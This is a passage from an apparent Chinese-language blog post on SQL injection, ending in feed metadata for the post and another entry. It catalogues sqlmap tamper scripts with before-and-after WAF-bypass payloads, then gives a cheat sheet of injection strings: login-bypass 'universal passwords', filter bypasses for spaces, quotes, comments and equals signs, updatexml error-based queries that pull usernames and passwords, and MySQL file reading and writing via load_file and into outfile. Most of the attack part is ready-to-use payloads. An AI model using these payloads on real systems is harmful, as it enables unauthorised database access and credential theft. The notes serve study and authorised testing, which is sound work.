SELECT</p><p>securesphere.py<br>适用数据库：ALL<br>作用：追加特定的字符串<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1 and ‘0having’=’0having’</p><p>space2dash.py<br>适用数据库：ALL<br>作用：将空格替换为–，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227</p><p>space2mssqlblank.py<br>适用数据库：Microsoft SQL Server<br>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br>作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Eid%0DFROM%07users</p><p>between.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：用NOT BETWEEN 0 AND #替换&gt;<br>使用脚本前：tamper(‘1 AND A &gt; B–’)<br>使用脚本后：1 AND A NOT BETWEEN 0 AND B–</p><p>percentage.py<br>适用数据库：ASP<br>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>作用：在每个字符前添加一个%<br>使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br>使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p><p>sp_password.py<br>适用数据库：MSSQL<br>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br>使用脚本前：tamper(‘1 AND 9227=9227– ‘)<br>使用脚本后：1 AND 9227=9227– sp_password</p><p>charencode.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p><p>randomcase.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：随机大小写<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：INseRt</p><p>charunicodeencode.py<br>适用数据库：ASP、ASP.NET<br>测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br>作用：适用字符串的unicode编码<br>使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br>使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p><p>space2comment.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将空格替换为/<strong>/<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT/</strong>/id/<strong>/FROM/</strong>/users</p><p>equaltolike.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br>作用：将=替换为LIKE<br>使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’)<br>使用脚本后：SELECT * FROM users WHERE id LIKE 1</p><p>equaltolike.py<br>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br>使用脚本前：tamper(‘1 AND A &gt; B’)<br>使用脚本后：1 AND GREATEST(A,B+1)=A</p><p>ifnull2ifisnull.py<br>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>测试通过数据库：MySQL 5.0 and 5.5<br>作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br>使用脚本前：tamper(‘IFNULL(1, 2)’)<br>使用脚本后：IF(ISNULL(1),2,1)</p><p>modsecurityversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：过滤空格，使用mysql内联注释的方式进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!30874AND 2&gt;1</em>/–</p><p>space2mysqlblank.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.1<br>作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p><p>modsecurityzeroversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：使用内联注释方式（/<em>!00000</em>/）进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!00000AND 2&gt;1</em>/–</p><p>space2mysqldash.py<br>适用数据库：MySQL、MSSQL<br>作用：将空格替换为 – ，并追随一个换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–%0AAND–%0A9227=9227</p><p>bluecoat.py<br>适用数据库：Blue Coat SGOS<br>测试通过数据库：MySQL 5.1,、SGOS<br>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=<br>使用脚本前：tamper(‘SELECT id FROM users where id = 1’)<br>使用脚本后：SELECT%09id FROM users where id LIKE 1</p><p>versionedkeywords.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br>作用：注释绕过<br>使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br>使用脚本后：1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p><p>halfversionedmorekeywords.py<br>适用数据库：MySQL &lt; 5.1<br>测试通过数据库：MySQL 4.0.18/5.0.22<br>作用：在每个关键字前添加mysql版本注释<br>使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)<br>使用脚本后：value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa</p><p>space2morehash.py<br>适用数据库：MySQL &gt;= 5.1.13<br>测试通过数据库：MySQL 5.1.41<br>作用：将空格替换为#，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p><p>apostrophenullencode.py<br>适用数据库：ALL<br>作用：用非法双字节Unicode字符替换单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %00%271%00%27=%00%271</p><p>appendnullbyte.py<br>适用数据库：ALL<br>作用：在有效载荷的结束位置加载null字节字符编码<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1%00</p><p>chardoubleencode.py<br>适用数据库：ALL<br>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p><p>unmagicquotes.py<br>适用数据库：ALL<br>作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br>使用脚本前：tamper(“1’ AND 1=1”)<br>使用脚本后：1%bf%27 AND 1=1–</p><p>randomcomments.py<br>适用数据库：ALL<br>作用：用注释符分割sql关键字<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：I/<strong>/N/</strong>/SERT</p><p>在熟悉了tamper脚本之后，我们应该学习tamper绕过脚本的编写规则，来应对复杂的实际环境。</p><h2 id="十八、绕过姿势-str-replace"><a href="#十八、绕过姿势-str-replace" class="headerlink" title="十八、绕过姿势   str_replace()"></a>十八、绕过姿势   <code>str_replace()</code></h2><p><strong>任何的表名、数据库名都可以使用十六进制代替</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= 0x7365637572697479),3--+</span></span><br></pre></td></tr></table></figure><p><strong>万能密码</strong>：<code>$sql=&quot;select * from test where username=&#39; XX &#39; and password=&#39; XX &#39; &quot;;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不知用户名时</span></span><br><span class="line"><span class="string">&#x27; or 1--+# 注释闭合</span></span><br><span class="line"><span class="string">&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1# 手动闭合</span></span><br><span class="line"><span class="string">&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="comment">## 使用了注释#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 知道一个用户名</span></span><br><span class="line">admin<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可尝试</span></span><br><span class="line">1<span class="string">&#x27;or(1)#</span></span><br></pre></td></tr></table></figure><p><strong>过滤 注释</strong>：</p><p>法一：截断 <code>;%00</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;%00</span><br><span class="line">?id=1<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1);%00</span></span><br></pre></td></tr></table></figure><p>法二：手动闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;and&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">?id=1<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)and&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure><p><strong>过滤空格</strong>：</p><p>括号包围：对于一些字段名可使用括号包围</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;</span>security<span class="string">&#x27;)),0x7e),1);%0</span></span><br></pre></td></tr></table></figure><p>字符编码绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以绕过空格的编码：</span></span><br><span class="line">%09  Tab键-水平</span><br><span class="line">%0a  换行</span><br><span class="line">%0c  换页</span><br><span class="line">%0b  Tab键-垂直</span><br><span class="line">%0d</span><br><span class="line">%00</span><br><span class="line">%a0  在特定字符集才可使用</span><br><span class="line"><span class="comment"># 特殊的 </span></span><br><span class="line">/**/</span><br></pre></td></tr></table></figure><p><strong>大小写绕过：</strong></p><p>Mysql 中，关键字是不区分大小写的，如果仅仅是过滤了 <code>select </code> ，那么我们可以使用 <code>SelECt</code> ，进行大小写混写绕过。</p><p><strong>正则匹配：</strong></p><p>正则如果匹配 <code>\bselect\b</code>  ，我们可以使用 <code>/*!50000select*/</code> 绕过。</p><p><img src="https://i.loli.net/2021/08/20/8BtLSruRD7nsIdp.png" alt="image-20210820224913933"></p><p><strong>一次过滤：双写绕过</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/select/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p><strong>and  or  过滤：双写绕过，或者是 &amp;&amp;–&gt;%26%26  ||–&gt;%7c%7c</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;||updatexml(1,concat(0x7e,database(),0x7e),1);%00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span>||updatexml(1,concat(0x7e,database(),0x7e),1)||<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p><strong>过滤了单双引号，但没有过滤 反斜杠  <code>\</code></strong></p><p>例如：sql 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from nres where id=&#x27;可控参数1&#x27; and title=&#x27;可控参数2&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>我们可以进行如下构造，不使用 单双引号，利用反斜杠</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=a\</span><br><span class="line">title=or sleep(3)<span class="comment">#</span></span><br><span class="line"><span class="comment">#这样拼起来的 sql 语句就是</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from nres where id=&#x27;a\&#x27; and title=&#x27;or sleep(3)#&#x27;&quot;</span>;</span><br><span class="line"><span class="comment"># 如此，or sleep(3)# 便成了一个整体，将会成功执行后面的 sleep(3)</span></span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=<span class="string">&#x27;a\&#x27;</span> and username=<span class="string">&#x27; or sleep(2)#&#x27;</span></span><br><span class="line">select * from users <span class="built_in">where</span> id=<span class="string">&#x27;a\&#x27;</span> and username=<span class="string">&#x27;union select 1,2,(select concat(username,0x7e,password) from users limit 1)#&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/20/jmOk2eyG7lXcwSd.png" alt="image-20210820230717823"></p><p><strong>引号逃逸：其实就是由于做了转义</strong></p><p>对单引号、双引号等进行转义之后，在一定程度上妨碍了我们的注入，当遇到这种情况，我们可以考虑：宽字节注入、二次注入、HTTP 头部注入</p><p><strong>字符串截断：</strong></p><p>在一些标题等位置，开发者一般会限制标题的字符长度，如果超过，有可能会被截断。</p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line"><span class="variable">$title</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$title</span>;</span><br><span class="line"><span class="variable">$title</span> = substr(<span class="variable">$title</span>,<span class="number">0</span>,<span class="number">10</span>);<span class="comment">#做了截断处理</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>.<span class="variable">$title</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;$title&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users values(15, &#x27;<span class="subst">$title</span>&#x27; , &#x27;<span class="subst">$content</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>.<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果攻击者想进行 sql 注入测试，可以选择输入 <code>aaaaaaaaa&#39;</code> ，则经过转义之后，将会变为 <code>aaaaaaaaa\&#39;</code> ，但是由于后面的截断，将变成 <code>aaaaaaaaa\</code>。</p><p>使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?title=aaaaaaaaa\<span class="string">&#x27;&amp;content=,1),(16,321,2)--+</span></span><br></pre></td></tr></table></figure><p>这样拼接到 sql 语句中就变成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into news values(15, <span class="string">&#x27;aaaaaaaaa\&#x27;</span> , <span class="string">&#x27;,1),(16,321,2)--+&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样 由于转义使得 <code>aaaaaaaaa\&#39; , </code> 成为了由单引号包围的一部分，也就成功执行了 插入语句。</p><p><img src="https://i.loli.net/2021/08/21/H68oDiqE1fGIw3S.png" alt="image-20210821105719366"></p><p><strong>过滤等号 <code>=</code></strong></p><p>使用 <code>like</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;)),0x7e),1))or&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="十九、其它"><a href="#十九、其它" class="headerlink" title="十九、其它"></a>十九、其它</h2><ol><li><p>在以上的任何一个注入方式中，都有可能对用户所输入的内容进行编码，例如进行 <code>base64</code> 编码，我们进行爆破时要记得编码；</p></li><li><p>Nosql 注入         <a href="https://www.cnblogs.com/bonelee/p/12158385.html">https://www.cnblogs.com/bonelee/p/12158385.html</a></p></li><li></li></ol><h2 id="二十、解决查内容时一次显示不全"><a href="#二十、解决查内容时一次显示不全" class="headerlink" title="二十、解决查内容时一次显示不全"></a>二十、解决查内容时一次显示不全</h2><p><strong>方法一：一条一条查</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x5e,(select concat(username,<span class="string">&#x27;~&#x27;</span>,password) from security.users <span class="built_in">limit</span> 0,1),0x5e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">and updatexml(1,concat(0x5e,(select concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password) from security.users <span class="built_in">limit</span> 0,1),0x5e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><strong>方法二：substr(,,)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每次查30个字符</span></span><br><span class="line">and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)),1,30) from security.users),0x5e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)),31,30) from security.users),0x5e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="总结：regexp-正则匹配速查表"><a href="#总结：regexp-正则匹配速查表" class="headerlink" title="总结：regexp 正则匹配速查表"></a>总结：regexp 正则匹配速查表</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">&lt;内容&gt; regexp <span class="string">&#x27;正则表达式&#x27;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">选项</th><th align="left">说明</th><th align="left">例子</th><th align="left">匹配值示例</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配文本的开始字符</td><td align="left">‘^b’ 匹配以字母 b 开头的字符串</td><td align="left">book、big、banana、bike</td></tr><tr><td align="left">$</td><td align="left">匹配文本的结束字符</td><td align="left">‘st$’ 匹配以 st 结尾的字符串</td><td align="left">test、resist、persist</td></tr><tr><td align="left">.</td><td align="left">匹配任何单个字符</td><td align="left">‘b.t’ 匹配任何 b 和 t 之间有一个字符</td><td align="left">bit、bat、but、bite</td></tr><tr><td align="left">*</td><td align="left">匹配零个或多个在它前面的字符</td><td align="left">‘f*n’ 匹配字符 n 前面有任意个字符 f</td><td align="left">fn、fan、faan、abcn</td></tr><tr><td align="left">+</td><td align="left">匹配前面的字符 1 次或多次</td><td align="left">‘ba+’ 匹配以 b 开头，后面至少紧跟一个 a</td><td align="left">ba、bay、bare、battle</td></tr><tr><td align="left">&lt;字符串&gt;</td><td align="left">匹配包含指定字符的文本</td><td align="left">‘fa’ 匹配包含‘fa’的文本</td><td align="left">fan、afa、faad</td></tr><tr><td align="left">[字符集合]</td><td align="left">匹配字符集合中的任何一个字符</td><td align="left">‘[xz]’ 匹配 x 或者 z</td><td align="left">dizzy、zebra、x-ray、extra</td></tr><tr><td align="left">[^ ]</td><td align="left">匹配不在括号中的任何字符</td><td align="left">‘[^abc]’ 匹配任何不包含 a、b 或 c 的字符串</td><td align="left">desk、fox、f8ke</td></tr><tr><td align="left">字符串{n,}</td><td align="left">匹配前面的字符串至少 n 次</td><td align="left">‘b{2}’ 匹配 2 个或更多的 b</td><td align="left">bbb、bbbb、bbbbbbb</td></tr><tr><td align="left">字符串 {n,m}</td><td align="left">匹配前面的字符串至少 n 次， 至多 m 次</td><td align="left">‘b{2,4}’ 匹配最少 2 个，最多 4 个 b</td><td align="left">bbb、bbbb</td></tr></tbody></table><p><strong>匹配中文时</strong>：<code>regexp &#39;(文字)&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp <span class="string">&#x27;[文字]&#x27;</span> <span class="comment">#报错</span></span><br><span class="line">regexp <span class="string">&#x27;文字&#x27;</span></span><br><span class="line">like <span class="string">&#x27;文字&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Mysql-对文件的操作"><a href="#Mysql-对文件的操作" class="headerlink" title="Mysql 对文件的操作"></a>Mysql 对文件的操作</h1><ul><li>load_file()</li><li>load data infile()</li><li>system cat</li></ul><p><strong>使用条件：1. 有File权限（File_priv的值）；2. secure_file_priv 的值不为 NULL</strong></p><p>注：&gt;=5.7.16默认值为NULL，&lt;5.7.16则为空</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看 File_priv</span><br><span class="line"><span class="keyword">select</span> File_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host <span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/01/DcqRGnP48OB7kW9.png" alt="image-20210601180220996"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#查看 secure_file_priv</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line">值是 <span class="keyword">NULL</span> <span class="comment">--- 不允许文件导入导出操作</span></span><br><span class="line">值是 空   <span class="comment">--- 不对mysql的导入导出操作做出限制</span></span><br><span class="line">值是 具体路径 限制mysql的导入与导出操作限制在指定路径下</span><br><span class="line">#修改</span><br><span class="line"># Windows 下</span><br><span class="line">修改 mysql.ini 文件 （secure_file_priv <span class="operator">=</span>）</span><br><span class="line"># Linux 下</span><br><span class="line">在<span class="operator">/</span>etc<span class="operator">/</span>my.cnf的[mysqld]下面添加<span class="keyword">local</span><span class="operator">-</span>infile<span class="operator">=</span><span class="number">0</span>选项</span><br></pre></td></tr></table></figure><p><strong>读取文件</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># load_file()</span><br><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;D:/test.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># load data infile()</span><br><span class="line"># 利用该函数读文件时需要将文件内容保存至一个表中</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(content text);</span><br><span class="line">load data infile <span class="string">&#x27;D:\\test.txt&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test;</span><br></pre></td></tr></table></figure><p><strong>写入文件</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:\\users.txt&#x27;</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;SQL-注入全解&quot;&gt;&lt;a href=&quot;#SQL-注入全解&quot; class=&quot;headerlink&quot; title=&quot;SQL 注入全解&quot;&gt;&lt;/a&gt;SQL 注入全解&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/</summary>
      
    
    
    
    <category term="WEB漏洞详解" scheme="https://xizhi-future.github.io/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    
    
    <category term="漏洞" scheme="https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="SQL注入" scheme="https://xizhi-future.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络概念、发展、性能</title>
    <link href="https://xizhi-future.github.io/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/"/>
    <id>https://xizhi-future.github.io/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/</id>
    <published>2021-10-07T10:05:01.000Z</published>
    <updated>2021-10-07T10:05:55.993Z</updated>
    
